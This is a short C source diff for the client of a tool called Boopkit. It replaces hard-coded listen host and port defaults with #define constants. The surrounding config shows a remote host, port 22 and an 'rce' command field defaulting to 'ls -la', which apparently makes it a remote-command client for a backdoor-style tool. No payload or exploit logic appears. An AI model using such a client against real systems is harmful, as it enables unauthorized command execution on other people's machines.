@@ -35,6 +35,13 @@
 #include "packets.h"
 // clang-format on
 
+// TCP requires a client host and port set in order to create a
+// proper TCP connection.
+// In the event boopkit-boop does have one set, we default
+//
+#define DEFAULT_LPORT "80"
+#define DEFAULT_LHOST "127.0.0.1"
+
 void usage() {
   asciiheader();
   boopprintf("\nBoopkit. (Client program)\n");
@@ -80,8 +87,8 @@ struct config {
  * @param argv
  */
 void clisetup(int argc, char **argv) {
-  strncpy(cfg.lhost, "127.0.0.1", INET_ADDRSTRLEN);
-  sprintf(cfg.lport, "%d", PORT);
+  strncpy(cfg.lhost, DEFAULT_LHOST, INET_ADDRSTRLEN);
+  strncpy(cfg.lport, DEFAULT_LPORT, MAX_ARG_LEN);
   strncpy(cfg.rhost, "127.0.0.1", INET_ADDRSTRLEN);
   strncpy(cfg.rport, "22", MAX_ARG_LEN);
   strncpy(cfg.rce, "ls -la", MAX_RCE_SIZE);
